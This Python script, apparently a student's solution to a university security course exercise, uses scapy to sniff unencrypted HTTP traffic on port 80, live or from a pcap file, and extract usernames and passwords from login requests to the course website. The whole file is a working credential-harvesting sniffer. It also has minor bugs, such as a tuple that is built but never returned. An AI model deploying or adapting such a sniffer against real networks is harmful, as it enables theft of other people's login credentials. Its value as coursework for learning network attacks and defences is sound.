import scapy.all as S
import urlparse


WEBSITE = 'infosec17.cs.tau.ac.il'


def parse_packet(packet):
    """
    If this is a login request to the course website, return the username
    and password as a tuple => ('123456789', 'opensesame'). Otherwise,
    return None.

    Note: You can assume the entire HTTP request fits within one packet.
    """

    #get the payload and parse it.
    payload = str(packet[S.TCP].payload)
    parse = dict(urlparse.parse_qs(payload))

    #If the host is not WEBSITE, return None
    if not check_host(payload):
        return None

    #if not 'POST' in payload:
    #    return None

    cond1 =  'password' in parse
    cond2 = 'username' in parse

    if cond1:
        if cond2:
            return (parse['username'], parse['password'])
        else:
            ('','')
    else:
        return None

def packet_filter(packet):
    """
    Filter to keep only HTTP traffic (port 80) from the client to the server.
    """
    return  S.TCP in packet and packet[S.TCP].dport == 80 and packet.haslayer(S.Raw)



#check that the host is the website
def check_host(payload):
    splited_payload = payload.split()
    if 'Host:' in splited_payload:
        host_index = splited_payload.index('Host:')
    else:
        return False
    return splited_payload[host_index+1] == WEBSITE


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args:
        print 'Usage: %s [<path/to/recording.pcap>]' % args[0]

    elif len(args) < 2:
        # Sniff packets and apply our logic.
        S.sniff(lfilter=packet_filter, prn=parse_packet)

    else:
        # Else read the packets from a file and apply the same logic.
        for packet in S.rdpcap(args[1]):
            if packet_filter(packet):
                print parse_packet(packet)


if __name__ == '__main__':
    import sys
    main(sys.argv)
